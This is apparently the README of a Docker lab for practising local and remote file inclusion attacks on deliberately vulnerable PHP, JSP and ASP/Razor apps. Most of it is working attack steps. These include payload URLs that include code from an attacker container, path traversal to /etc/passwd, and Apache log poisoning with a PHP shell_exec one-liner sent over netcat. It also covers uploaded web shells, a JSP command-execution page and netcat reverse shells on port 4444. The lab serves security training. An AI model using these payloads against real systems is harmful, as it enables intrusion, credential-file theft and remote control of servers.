# Installation

- Install Docker (verified with version 2.0.0.3)
- If you want to use the windows network on a non Windows OS also install [VirtualBox](https://www.virtualbox.org/) 

## Ubuntu

Check if you have docker-machine and docker-compose also installed. 
Notice that if not added to docker group, docker has to be run with sudo.

## Windows

Using [Cmder](https://cmder.net/) on Windows you can run `docker-compose -f lfi_linux_network.yml up --build` to run the linux network. 

# Payloads

For an in-detail-description of the following payloads go to [https://secf00tprint.github.io/blog/payload-tester/lfirfi/en](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en)

## RFI

For the RFI payloads you have to change the IP to the IP from the internal network in every link. Use `docker inspect <docker_attacker_id>` to get the IP.

## PHP

### RFI 

PoCs RFI:

- [http://127.0.0.1:8883/lfi.php?language=http://google.com?q=](http://127.0.0.1:8883/lfi.php?language=http://google.com?q=)

- [http://127.0.0.1:8883/lfi.php?page=http://textfiles.com](http://127.0.0.1:8883/lfi.php?page=http://textfiles.com)

Code running on the victim server:

- [http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_victim.txt](http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_victim.txt)

Code running on the attacker server:

- [http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_attacker.php](http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_attacker.php)

### LFI

#### Verification

Upload check.php from attacker-server src folder

then:

- [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check) or
- [http://127.0.0.1:8883/lfi.php?language=uploads/check](http://127.0.0.1:8883/lfi.php?language=uploads/check)

#### Exploits

#### etc/passwd

[http://127.0.0.1:8883/lfi.php?page=/etc/passwd](http://127.0.0.1:8883/lfi.php?page=/etc/passwd)

By way of experiment add `../` before `etc/passwd` until ...

[http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd](http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd)

#### Log Injection

Get `access.log`: 

Changed here to `access_combined.log`. The used docker image pipes `access.log` to stdout, so the default log of the apache is know changed. (If somebody knows a way to change `access.log`->`stdout` for this image to write both to stdout and in the file help would be appreciated, please mail me):

[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log)

Then use:

```
nc -nv 127.0.0.1 8883
<?php echo shell_exec($_GET['cmd']);?>
```

and

[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id)

Check for uid in output

#### Shell

- Upload shell.php
- goto: [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell)
- then:

```
docker exec -ti <containerid_attackerserver> /bin/bash
nc 172.18.0.1 4444
```

## JSP

### RFI

(You have to adjust ip addresses to the attacker server in the docker network)

- [http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor](http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor)

### LFI

Upload runme.jsp from attacker_server_jsp for Remote Code Execution:

- [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls)
- [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd)

## ASP / Razor

Use [https://github.com/StefanScherer/windows-docker-machine](https://github.com/StefanScherer/windows-docker-machine) to get a windows docker environment

Upload the files and call:

`SimpleEchopayload.cshtml`

[http://192.168.99.90:8080/?test=SimpleEchoPayload.cshtml](http://192.168.99.90:8080/?test=SimpleEchoPayload.cshtml)

`WinLfiPayload.cshtml`

[http://192.168.99.90:8080/?test=WinLfiPayload.cshtml](http://192.168.99.90:8080/?test=WinLfiPayload.cshtml)

`CheckPowerShell.cshtml`

[http://192.168.99.90:8080/?test=CheckPowerShell.cshtml](http://192.168.99.90:8080/?test=CheckPowerShell.cshtml)

`RevShell.cshtml`, change IP to attacker server ip in the file

nc -nlvp 4444 at attacker server, then:

[http://192.168.99.90:8080/?test=RevShell.cshtml](http://192.168.99.90:8080/?test=RevShell.cshtml)

